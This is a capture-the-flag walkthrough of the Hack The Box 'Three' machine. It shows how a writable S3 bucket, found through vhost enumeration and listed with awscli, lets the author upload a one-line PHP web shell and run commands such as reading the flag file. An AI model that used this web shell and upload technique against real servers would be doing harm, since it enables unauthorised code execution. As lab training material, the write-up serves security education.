🚩 Hack The Box: Three (Writeup)
Machine Name: Three

Difficulty: Very Easy (Tier 1)

Platform: Hack The Box Starting Point

📝 Introduction
Three is a Tier 1 machine that focuses on Cloud Security and AWS S3 Bucket misconfigurations. It demonstrates how a poorly secured storage bucket can lead to Remote Code Execution (RCE) on a web server.

🔍 Step 1: Enumeration
I started by scanning the target machine for open ports and services using Nmap.

Command: nmap -sV {TARGET_IP}

Findings: - Port 80/tcp: Apache web server running.

Port 22/tcp: SSH service open.

Domain Discovery: Found an email address in the "Contact" section pointing to the domain thetoppers.htb. I added this to my /etc/hosts file.

🚀 Step 2: Sub-domain Enumeration
Using a tool like gobuster, I searched for hidden sub-domains.

Command: gobuster vhost -w {wordlist} -u http://thetoppers.htb

Result: Found a sub-domain named s3.thetoppers.htb. This indicated that an Amazon S3 service was likely running. I added this new sub-domain to /etc/hosts as well.

🛡️ Step 3: Exploitation (S3 Bucket Access)
To interact with the S3 bucket, I used the awscli tool.

Listing Buckets:

Command: aws --endpoint=http://s3.thetoppers.htb s3 ls

Result: Found a bucket named thetoppers.htb.

Analyzing the Bucket:

Action: Listed the files inside the bucket and realized it contained the website's source code (index.php, images, etc.). This meant I had write access to the webroot.

Uploading a Web Shell:

Created a simple PHP shell: <?php system($_GET["cmd"]); ?>

Upload Command: aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

Result: File successfully uploaded!

🏆 Step 4: Finding the Flag
Now that my shell was on the server, I could execute commands via the browser.

Verification:

Visited: http://thetoppers.htb/shell.php?cmd=id (Confirmed code execution).

Retrieving the Flag:

Used the cat command in the URL to find the flag.

Final Command: http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt

Flag: [Flag Successfully Captured]

💡 Key Learnings
S3 Bucket Security: Publicly writable S3 buckets are a massive security risk, allowing attackers to modify website content or upload malicious scripts.

Vhost Enumeration: Always look for sub-domains, especially when cloud-related services are hinted at.

AWS CLI: Learned how to use the aws utility to manage and interact with cloud storage endpoints.
